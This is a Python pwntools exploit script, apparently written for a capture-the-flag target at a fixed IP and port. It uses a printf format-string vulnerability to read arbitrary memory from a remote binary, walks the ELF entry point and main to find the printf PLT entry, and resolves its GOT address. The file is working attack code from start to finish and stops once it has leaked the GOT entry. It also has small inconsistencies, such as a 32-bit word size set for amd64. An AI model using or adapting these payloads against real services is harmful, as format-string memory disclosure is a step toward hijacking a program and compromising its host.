from pwn import *
import subprocess
import re
import sys
import time


default_load_addr = 0x0000000000400000

HOST = "172.15.11.101"
PORT = 1337
# setting 

context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']

context.log_level = 'INFO'



def get_printf_got_entry():
    # Read the entry point at offset 0x18 of the elf header.
    entry_point = unpack(leak.n(default_load_addr + 0x18, 8))
    log.success("Entry addr: 0x%08X", entry_point)

    # The entry point is the standard libc entry, so it will be a call and the real main() will be passed as the third arg.
    entry_point_code_length = 43  # Just a guess. It's okay to read more.. as long as we see the instruction we want
    entry_point_code = leak.n(entry_point, entry_point_code_length)

    # Look for the third arg, that will contain the address of the real main()
    results = re.findall("mov\s+rdi,0x([0-f]+)", disasm(entry_point_code, vma=entry_point, byte=False))
    assert results is not None and len(results) == 1, "Corrupted entry point code, are we getting the correct address?"

    main_code_addr = int(results[0], 16)
    log.success("Main code addr: 0x%08X", main_code_addr)

    """
    We know the code should look like:
      start:
        sub    rsp,0x100
        mov    rdi,rsp
        call   _gets
        mov    edi,0x1
        call   _sleep
        mov    rdi,rsp
        call   _printf
        add    rsp,0x100
        jmp    start
        ...
        ret
    So we'll want to read the third `call` in order to get the address of printf() plt entry.
    """

    main_code_length = 46  # Just a guess. It's okay to read more.. as long as we see the instruction we want
    main_code = leak.n(main_code_addr, main_code_length)
    main_code_disas = disasm(main_code, vma=main_code_addr, byte=False)

    # Look for the third call, that will contain the address of printf() plt entry
    results = re.findall("call\s+0x([0-f]+)", main_code_disas)
    assert results is not None and len(results) == 3, "Corrupted main code, are we getting the correct address?"

    printf_plt_addr = int(results[2], 16)
    log.success("printf() PLT addr: 0x%08X", printf_plt_addr)

    return get_got_from_plt(printf_plt_addr)

def get_got_from_plt(plt_addr):
    plt_length = 6  # Just a guess. It's okay to read more.. as long as we see the instruction we want
    plt = leak.n(plt_addr, plt_length)

    # PLT entries look like: "jmp [GOT_ENTRY]" so we want to get the resolved GOT_ENTRY from the first jump
    results = re.findall("jmp\s+.*\s+#\s+0x([0-f]+)", disasm(plt, vma=plt_addr, byte=False))
    assert results is not None and len(results) == 1, "Corrupted plt code, are we getting the correct address?"

    got_addr = int(results[0], 16)
    return got_addr


def leak(addr):
    payload = "%16$p.AAA"+p64(addr)
    r.sendline(payload)
    print "leaking:", hex(addr)
    resp = r.recvuntil(".AAA")
    ret = resp[:-4:] + "\x00"
    print "ret:", repr(ret)
    r.recvrepeat(0.2)
    return ret

def absolute_read(addr):
    addr_payload = pack(addr)
    resp = send_payload("XLEETX%20$pXTEELX" + addr_payload)
    results = re.findall("XLEETX(.*)XTEELX", resp, re.MULTILINE | re.DOTALL)

    assert len(results) == 1, "Bad read!"

    result = results[0]

    if result == '':
        result = '\x00'

    return result

def send_payload(payload):
    assert b"\n" not in payload
    log.info("payload = %s" % repr(payload))
    r.sendline(payload)
    return r.recv()

if __name__ == "__main__":
    r = remote(HOST, PORT)

    leak = MemLeak(absolute_read)
    log.info("Looking for printf GOT entry...")
    printf_got = get_printf_got_entry()
    log.success("printf() GOT entry addr: 0x%08X", printf_got)
